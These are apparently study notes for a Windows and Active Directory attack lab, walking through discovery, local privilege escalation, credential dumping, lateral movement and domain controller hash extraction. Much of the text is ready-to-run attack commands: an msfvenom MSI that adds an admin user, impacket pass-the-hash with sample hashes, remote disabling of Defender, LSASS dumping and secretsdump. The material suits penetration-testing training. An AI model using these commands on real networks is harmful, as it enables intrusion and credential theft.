# Windows Attack example
Based on lab tasks: Maintaining access and Lateral Movement

**Premise**
We have already gained access (infected 2 machines): 
- a linx machine
- a windows machine
    - with ad user tmassie (without local admin rights)
    - tools like Mimikatz, etc. are available 
        - (in a real environment, these tools would be detected)



## 1. Basics, Host + Service discovery
From the Linux machine, we perform analysis of the network
1. `ip -c address list eth0`  (as root): we get our IP and network address
2. Host discovery via Nmap 
    - `nmap -n -Pn --top-ports=10 10.0.1.0/24 -oA nmap_winlab_host_discovery --min-rate=5000` (will write result into file because of -oA)
        - -n -> no DNS resolution
        - --min-rate=5000 -> set a minimum rate to guarantee a timely result
    - `cat nmap_winlab_host_discovery.gnmap | awk '/Up/ {print $2}' | sort -Vu > hosts_winlab.txt` 
        - take result from nmap scan and write ip's into a file (`cat cat hosts_winlab.txt`)
3. Service discovery
    - `nmap -n -sC -sV -iL hosts_winlab.txt -oA nmap_winlab_script_version_scan --min-rate=5000` takes list of Ips and runs service discovery (via -iL param)
        - sC -> Script Scan -> Runs default scripts against known services
        - -sV -> Service/Version detection -> Tries to determine service/version for open ports

## Situational awareness and privilege escalation to local admin

**Windows configuration check with PrivescCheck**
Run PrivescCheck ( https://github.com/itm4n/PrivescCheck ) to get info about windows configuration. 
1. `powershell -exec bypass`
2. `cd C:\temp\tools\PrivescCheck\`
3. `Import-Module .\PrivescCheck.ps1`
4. `Invoke-PrivescCheck` -> we get result with configuration issues. 
    - We might see something like: "CONFIG > WSUS Configuration" or "CONFIG > AlwaysInstallElevated"

**Privilege escalation vie AlwaysInstalledElevated**
We assume the the PrivescCheck has shown we are vulnerable AlwaysInstalledElevated
(allows to run MSI as admin https://learn.microsoft.com/en-us/windows/win32/msi/alwaysinstallelevated). 
Our goal is now create an msi that creates a local admin and run it. 

1. Create msi metasploit/msfvenom (on linux)
    - `msfvenom -p windows/x64/exec CMD='cmd.exe /k "net user /add hacker Hacker@Work && net localgroup administrators hacker /add"' -f msi > useradd.msi`
        - will create a msi file "useradd.msi" that runs the following code: "net user /add hacker Hacker@Work && net localgroup administrators hacker /add"$
        - User to be created: "hacker" with password "Hacker@Work"
2. Copy file to windows machine
    - any means is possible (web attachment, file share etc.)
    - one way is gosh, as small webserver: https://github.com/patrickhener/gosh (see lab task)
    - attention: when downloading on windows machine, one might have to click away warning
3. Run created msi on linux
    - just run created msi (click away warning) and user is created (even if installer seems to abort)
4. Check
    - run `net user` and `net user hacker` to see if creation was successful
5. run as local admin (hacker)
    - start cmd as admin, pop up will show and we can enter credentials ("hacker", "Hacker@Work")
    - now we can run commands as local admin
        `whoami /groups?` -> we see that our user is in Administrator group and by "Mandatory label\High Mandatory Level" we see it runs in elevated mode

## Active directory info gathering & analysis

1. Runs PingCastle `.\PingCastle.exe` and choose healthcheck to generate result as html. 
https://www.pingcastle.com/PingCastleFiles/ad_hc_rules_list.html


2. Run bloodhound to find potential paths to domain admin
    - collect AD data and import it into bloodhound (for example via SharpHound)
    - find path to domain admin (or whatever we would like to do)
    - *see lab tasks "Maintain Access/AD Information Gathering & Analysis" or "Bloodhound_AD.md*

## Get other credentials from LSASS/SAM 
Using Mimimkatz, we can now get credentials of other (currently logged on) users. (or some other tool would be possible too)
Via Mimikatz we can get credentials (NTLM hashes) from
- LSASS process (AD accounts)
- SAM process (local accounts)
If we get new credentials, we can afterwards update Bloodhound paths (owned flag) to see how much closer we got to our target.

*see lab tasks "Maintain Access/Credential Dumping on Windows 10 Client" or "Mimikatz_Credentials.md*

## Lateral movement
Various possibilities

- Based on NTLM 
    - pass-the-hash
    - NTLM relay (man-in-the-middle)
    - break NTLM hash (as not that strong)
- Password spraying (get password)

 - bypass firewalls, prevent inspection,  prevent being detected
    - Port forwarding
    - SOCKS Pivoting (???)

- Based on Kerberos
    - "Overpass the hash" -> get a TGT for another tickes via stolen preauthentication data
    - Pass the ticket (TGT)
    - Golden tickets -> forged ticket-granting tickets
    - Silver ticket -> forge a service ticket 
    - Kerberoasting
        - try to get weack hash from service to crack password


**Pass the hash** via linux Impacker
https://github.com/fortra/impacket 
Impacket-psexes is using psexec implementation and pass-the-hash. (if psexec impl. is blocked, try smb)

In linux terminal: 
- `impacket-psexec`  will show help
- `impacket-psexec -hashes :9859340265d3b3c1eb628ece70ebc238 winattacklab.local/aalfort@10.0.1.101`
    - Params
        - User to impersonate: aalfort
        - NTLM hash of the user's password: 9859340265d3b3c1eb628ece70ebc238
        - Domain name: winattacklab.local
        - IP address of the target system: 10.0.1.101 (FS1.winattacklab.local)
    - What is happening under the hood
        - Uploads PSEXESVC.exe to the $ADMIN shared folder
        - Remotely creates a service that will run PSEXESVC.exe
        - Remotely starts the service
        - Executes our commands/program under the parent process PSEXESVC.exe
        - Redirects the input/output of the process via SMB named pipes
        - When complete, the PsExec Windows service will be stopped and removed remotely
- Check if we are on the right machine
    - `hostname` -> expected to show name of host (e.g. "FS1")
    - `whoami` ->  expected output "nt authority\system" (not allfort becuase psexec automatically upgrades to highest possible provileges, otherwise allfort would be correct)


Similar and varia: 
- `impacket-smbclient -hashes :9859340265d3b3c1eb628ece70ebc238 winattacklab.local/aalfort@10.0.1.101`
    - smb client with pass-the-hash support
    - now possible to find shares: `shares`, then `use FOUNDSHARE`, then `ls`, and to get a file: `get HR\employees\someFile.docx` (and `exit` to return)
- `impacket-psexec 'winattacklab.local/cclear:Welc0me2022!@10.0.1.103'`
    - also possible to use plain password
- Potentially Windows Defender (or some other AV tool). impacket-smbclient tends to be less easily detected by AV tools (and windows defender)

**Search in files via Snaffler**
Snaffler can search through files with interesting (potentially compromissing) content. 
In default mode, Snaffler will enumerate all file shares.

To just run on fs1.winattacklab.local and write to file:
`Snaffler.exe --outfile C:\temp\tools\Snaffler\snaffler_aalfort_fs1.log --comptarget fs1.winattacklab.local --stdout`

*Remark: Snaffler doesnt support pass-the-hash but it is possible to first get a cmd via Mimikatz and then run Snaffler*

**Password spraying with Rubeus**
0. Best to check password lockout policy: 
    - `net accounts /domain` ideally lockout threshold is set to never (so no lockout)
1. Prepare password list with possible passwords: "passwords.txt"
2. Execute Rubeus: `.\Rubeus_v4.0.exe brute /passwords:passwords.txt /outfile:out.txt`
    - will query AD to get users


**Creating/Analyzing LSASS dump**
via task manager from windows
0. Log in do machine with admin user
1. Disable windows defender in windows security settings (otherwise its blocked)  
2. Open Task manager
3. Select "Lsass.exe" 
4. Right click and "Create dump file"

Via tool ProcDump (from remote linux)
0. Disable windows defender
    - `impacket-atexec 'winattacklab.local/cclear:Welc0me2022!@10.0.1.103' "powershell -c Set-MpPreference -DisableRealtimeMonitoring 1"` (actual command: "Set-MpPreference -DisableRealtimeMonitoring 1")
1. Get procdump: `curl -LO http://live.sysinternals.com/procdump64.exe`
    - check: `file procdump64.exe` -> should return meaningful result
2. Upload procdum: 
    - `impacket-smbclient 'winattacklab.local/cclear:Welc0me2022!@10.0.1.103'`
    - `use c$` > `put procdump64.exe` (verify with "ls" and then "exit")
3. Execute procdum
    - `impacket-psexec 'winattacklab.local/cclear:Welc0me2022!@10.0.1.103'` (connect)
    - `c:\procdump64.exe -accepteula -ma lsass.exe c:\lsass_procdump.dmp` (run)
    - `exit`
4. get dump
    - `impacket-smbclient 'winattacklab.local/cclear:Welc0me2022!@10.0.1.103'` best from home directory on linux
    - `use c$` > `get lsass_procdump.dmp`  > `exit`
    - dump should now be on linux system (verify with "ls -alh")
exit`

Analyze lsass dump via pypykatz (on linux)
1. `pypykatz lsa minidump lsass.DMP >> pypykatz.log`
    - Alternative: `pypykatz lsa minidump lsass_procdump.dmp >> pypykatz.log`
2. Open generated logfile pypykatz.log with an editor
    - example: `mousepad pypykatz.log`
3. Search for relevant NTLM hashes of relevant user
    - example: "NT: e4817e3c667f5df2b2b2b0dc37ca25f9"
*Alternative: we could have analyzed the dump via Mimikatz (or some other tool)*


## What to do as Domain Admin
**Possibilities**
- might be detected
    - Create new domain admin account -> OK, but quite noisy and usually gets detected quickly
    - Grant domain admin privileges to an existing domain account -> BETTER, but still very noisy
    - Dump/replicate ALL hashes from DC -> NO GO! This would unnecessarily expose all credentials in the
domain, including the krbtgt hash (AD main secret, can be compared to a “Generalschlüssel”) and it is
very “noisy” obviously.
- Dump/replicate some specific hashes only (as a proof of concept / exactly what you need for the
business objective) -> GOLD ANSWER


**Dump NTLM hashes from domain controller**
example 
`impacket-secretsdump -hashes :e4817e3c667f5df2b2b2b0dc37ca25f9 -just-dc-user tmassie ffast@10.0.1.100`
    - Username to connect with: ffast (domain admin)
    - NTLM hash of this user (ffast): e4817e3c667f5df2b2b2b0dc37ca25f9
    - Target username: tmassie
    - IP of the domain controller: 10.0.1.100
    for 

Remark: dumping all would be "impacket-secretsdump -hashes :e4817e3c667f5df2b2b2b0dc37ca25f9 -just-dc ffast@10.0.1.100" (noisy)

**Connect via RDP if we only have the hash (Mimikatz)**
see lab task "Lateral Movement/Abusing Domain Admin"

## GeneralVaria/Random
Usually, these steps might have to be applied multiple times (in rounds). Example: from a machine we escalate to local admin, to get AD credentials of another user so we can jump to another machine, to which other users are logged in etc. etc.

